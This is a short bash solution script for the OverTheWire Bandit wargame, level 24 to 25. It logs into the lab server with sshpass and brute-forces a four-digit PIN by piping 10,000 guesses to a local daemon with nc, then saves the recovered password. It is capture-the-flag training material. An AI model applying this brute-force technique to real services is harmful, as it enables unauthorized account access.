#! /bin/bash

# Use of loops in shell scripts

PASS24=$(cat ./level_pass/level24)

PASS25=$(sshpass -p "$PASS24" ssh bandit24@bandit.labs.overthewire.org -p 2220 "for i in {10000..19999};do echo \$i | cut -c 2- >> /tmp/lvl240;done; sed -i 's/^/${PASS24} /' /tmp/lvl240; nc localhost 30002 < /tmp/lvl240 | grep 'The password' | rev | cut -d ' ' -f1 | rev") 

sshpass -p "$PASS24" ssh bandit24@bandit.labs.overthewire.org -p 2220 "rm /tmp/lvl240"

tput setab 7;tput setaf 1;echo "Level 25 password: $PASS25";tput sgr0

echo " "

tput setab 1;tput setaf 7;echo "You have destroyed bandit!!";tput sgr0

echo "$PASS25" > ./level_pass/level25
